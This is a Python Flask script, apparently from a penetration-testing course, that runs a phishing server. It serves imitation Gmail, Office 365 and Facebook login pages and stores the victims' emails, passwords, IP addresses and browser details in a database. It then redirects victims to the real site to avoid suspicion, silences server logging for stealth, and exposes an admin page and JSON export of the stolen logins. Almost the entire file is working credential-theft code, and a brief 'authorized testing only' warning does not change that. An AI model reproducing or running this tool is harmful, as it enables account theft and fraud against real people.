#!/usr/bin/env python3
"""
Script Name: phishing_server.py
Lesson: 03 - Physical Access & Client-Side Attacks
Similar to: Social Engineering Toolkit (SET), Gophish
Description: Create convincing phishing pages with credential capture

Usage:
    python3 phishing_server.py --target gmail --port 8080
    python3 phishing_server.py --template custom --html login.html

Educational Notes:
    - Demonstrates social engineering techniques
    - Shows credential harvesting methods
    - Teaches web server basics
"""

import argparse
import json
import os
import sqlite3
from datetime import datetime
from flask import Flask, request, render_template_string, redirect, url_for
import logging

class PhishingServer:
    def __init__(self, port=8080):
        self.app = Flask(__name__)
        self.port = port
        self.credentials_db = "credentials.db"
        self.setup_database()
        self.setup_routes()
        
        # Disable Flask logging for stealth
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)

    def setup_database(self):
        """Initialize SQLite database for credential storage"""
        conn = sqlite3.connect(self.credentials_db)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                target TEXT,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT
            )
        ''')
        
        conn.commit()
        conn.close()

    def log_credentials(self, target, username, password, ip_address, user_agent):
        """Log captured credentials to database"""
        conn = sqlite3.connect(self.credentials_db)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO credentials (timestamp, target, username, password, ip_address, user_agent)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (datetime.now().isoformat(), target, username, password, ip_address, user_agent))
        
        conn.commit()
        conn.close()
        
        print(f"[+] Captured credentials: {username}:{password} from {ip_address}")

    def get_gmail_template(self):
        """Gmail login page template"""
        return '''
<!DOCTYPE html>
<html>
<head>
    <title>Gmail - Sign In</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700" rel="stylesheet">
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background-color: #f5f5f5; }
        .container { max-width: 400px; margin: 100px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { color: #4285f4; font-size: 24px; margin: 0; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; color: #333; font-size: 14px; }
        input[type="email"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        .btn { background-color: #4285f4; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; width: 100%; }
        .btn:hover { background-color: #3367d6; }
        .error { color: red; font-size: 14px; margin-top: 10px; }
        .footer { text-align: center; margin-top: 30px; color: #666; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Gmail</h1>
            <p>Sign in to your account</p>
        </div>
        
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
        
        <form method="POST" action="/login">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <button type="submit" class="btn">Sign In</button>
        </form>
        
        <div class="footer">
            <p>Google Privacy Policy | Terms of Service</p>
        </div>
    </div>
</body>
</html>
'''

    def get_office365_template(self):
        """Office 365 login page template"""
        return '''
<!DOCTYPE html>
<html>
<head>
    <title>Sign in to your account</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f3f2f1; margin: 0; padding: 0; }
        .container { max-width: 440px; margin: 100px auto; background: white; padding: 60px 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
        .logo { text-align: left; margin-bottom: 30px; }
        .logo h1 { color: #323130; font-size: 24px; margin: 0; font-weight: 600; }
        .subtitle { color: #323130; font-size: 16px; margin-bottom: 24px; }
        .form-group { margin-bottom: 16px; }
        input[type="email"], input[type="password"] { width: 100%; padding: 8px 12px; border: 1px solid #8a8886; font-size: 15px; line-height: 20px; box-sizing: border-box; }
        .btn { background-color: #0067b8; color: white; padding: 8px 16px; border: none; cursor: pointer; font-size: 15px; }
        .btn:hover { background-color: #106ebe; }
        .error { color: #d13438; font-size: 13px; margin-top: 4px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Microsoft</h1>
        </div>
        
        <div class="subtitle">Sign in</div>
        
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
        
        <form method="POST" action="/login">
            <div class="form-group">
                <input type="email" name="email" placeholder="Email, phone, or Skype" required>
            </div>
            
            <div class="form-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            
            <button type="submit" class="btn">Sign in</button>
        </form>
    </div>
</body>
</html>
'''

    def get_facebook_template(self):
        """Facebook login page template"""
        return '''
<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; }
        .container { max-width: 400px; margin: 100px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo h1 { color: #1877f2; font-size: 56px; margin: 0; font-weight: bold; }
        .subtitle { text-align: center; color: #1c1e21; font-size: 28px; margin-bottom: 20px; }
        input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
        .btn { background-color: #1877f2; color: white; padding: 12px; border: none; border-radius: 6px; cursor: pointer; font-size: 20px; font-weight: bold; width: 100%; }
        .error { color: #f02849; font-size: 14px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>facebook</h1>
        </div>
        <div class="subtitle">Connect with friends and the world around you on Facebook.</div>
        
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
        
        <form method="POST" action="/login">
            <input type="text" name="email" placeholder="Email or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" class="btn">Log In</button>
        </form>
    </div>
</body>
</html>
'''

    def setup_routes(self):
        """Setup Flask routes"""
        
        @self.app.route('/')
        def index():
            target = request.args.get('target', 'gmail')
            error = request.args.get('error')
            
            templates = {
                'gmail': self.get_gmail_template(),
                'office365': self.get_office365_template(),
                'facebook': self.get_facebook_template()
            }
            
            template = templates.get(target, self.get_gmail_template())
            return render_template_string(template, error=error)
        
        @self.app.route('/login', methods=['POST'])
        def login():
            target = request.args.get('target', 'gmail')
            email = request.form.get('email')
            password = request.form.get('password')
            
            # Log credentials
            self.log_credentials(
                target=target,
                username=email,
                password=password,
                ip_address=request.remote_addr,
                user_agent=request.headers.get('User-Agent')
            )
            
            # Redirect to real site to avoid suspicion
            redirect_urls = {
                'gmail': 'https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fmail.google.com',
                'office365': 'https://login.microsoftonline.com/',
                'facebook': 'https://www.facebook.com/'
            }
            
            return redirect(redirect_urls.get(target, redirect_urls['gmail']))
        
        @self.app.route('/admin')
        def admin():
            """Admin panel to view captured credentials"""
            conn = sqlite3.connect(self.credentials_db)
            cursor = conn.cursor()
            
            cursor.execute('SELECT * FROM credentials ORDER BY timestamp DESC')
            credentials = cursor.fetchall()
            
            conn.close()
            
            html = '''
            <html>
            <head><title>Phishing Admin Panel</title></head>
            <body>
                <h1>Captured Credentials</h1>
                <table border="1" style="border-collapse: collapse;">
                    <tr>
                        <th>Timestamp</th>
                        <th>Target</th>
                        <th>Username</th>
                        <th>Password</th>
                        <th>IP Address</th>
                        <th>User Agent</th>
                    </tr>
            '''
            
            for row in credentials:
                html += f'''
                    <tr>
                        <td>{row[1]}</td>
                        <td>{row[2]}</td>
                        <td>{row[3]}</td>
                        <td>{row[4]}</td>
                        <td>{row[5]}</td>
                        <td>{row[6][:50]}...</td>
                    </tr>
                '''
            
            html += '''
                </table>
                <br>
                <a href="/admin/export">Export as JSON</a>
            </body>
            </html>
            '''
            
            return html
        
        @self.app.route('/admin/export')
        def export():
            """Export credentials as JSON"""
            conn = sqlite3.connect(self.credentials_db)
            cursor = conn.cursor()
            
            cursor.execute('SELECT * FROM credentials')
            rows = cursor.fetchall()
            
            credentials = []
            for row in rows:
                credentials.append({
                    'id': row[0],
                    'timestamp': row[1],
                    'target': row[2],
                    'username': row[3],
                    'password': row[4],
                    'ip_address': row[5],
                    'user_agent': row[6]
                })
            
            conn.close()
            
            from flask import Response
            return Response(
                json.dumps(credentials, indent=2),
                mimetype='application/json',
                headers={'Content-Disposition': 'attachment; filename=credentials.json'}
            )

    def run(self):
        """Start the phishing server"""
        print(f"[+] Starting phishing server on port {self.port}")
        print(f"[+] Access URLs:")
        print(f"    Gmail:      http://localhost:{self.port}/?target=gmail")
        print(f"    Office365:  http://localhost:{self.port}/?target=office365")
        print(f"    Facebook:   http://localhost:{self.port}/?target=facebook")
        print(f"    Admin:      http://localhost:{self.port}/admin")
        print(f"[!] WARNING: Only use for authorized penetration testing!")
        
        self.app.run(host='0.0.0.0', port=self.port, debug=False)

def main():
    parser = argparse.ArgumentParser(description="Phishing server for credential harvesting")
    parser.add_argument('--port', type=int, default=8080, help='Server port (default: 8080)')
    parser.add_argument('--target', choices=['gmail', 'office365', 'facebook'], 
                       default='gmail', help='Default phishing target')
    
    args = parser.parse_args()
    
    server = PhishingServer(port=args.port)
    
    try:
        server.run()
    except KeyboardInterrupt:
        print("\n[+] Server stopped")
    except Exception as e:
        print(f"[!] Error: {e}")
        return 1
    
    return 0

if __name__ == "__main__":
    exit(main())